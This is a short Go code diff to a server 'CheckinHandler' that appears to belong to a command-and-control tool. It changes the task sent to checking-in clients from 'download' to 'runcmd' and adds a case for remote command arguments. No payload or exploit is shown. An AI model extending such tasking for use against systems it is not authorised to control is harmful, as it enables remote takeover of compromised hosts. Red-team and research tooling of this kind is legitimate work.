@@ -18,11 +18,11 @@ func CheckinHandler(w http.ResponseWriter, r *http.Request) {
 	var response models.ServerTaskResponse
 
 	// TEMPORARY: For testing, always create a task
-	// Later this will be driven by your UI/API
+	// Later this will be driven by UI/API
 	response.TaskAvailable = true
 
-	// Create command arguments (using your existing function)
-	command := "download" // Hardcoded for now
+	// Create command arguments (using existing function)
+	command := "runcmd" // Hardcoded for now
 	var commandArgs json.RawMessage
 
 	switch command {
@@ -30,6 +30,8 @@ func CheckinHandler(w http.ResponseWriter, r *http.Request) {
 		commandArgs = returnDownloadStruct(w)
 	case "upload":
 		commandArgs = returnUploadStruct(w)
+	case "runcmd":
+		commandArgs = returnRunCmdStruct(w)
 	default:
 		// For commands without special args
 		commandArgs = json.RawMessage("{}")
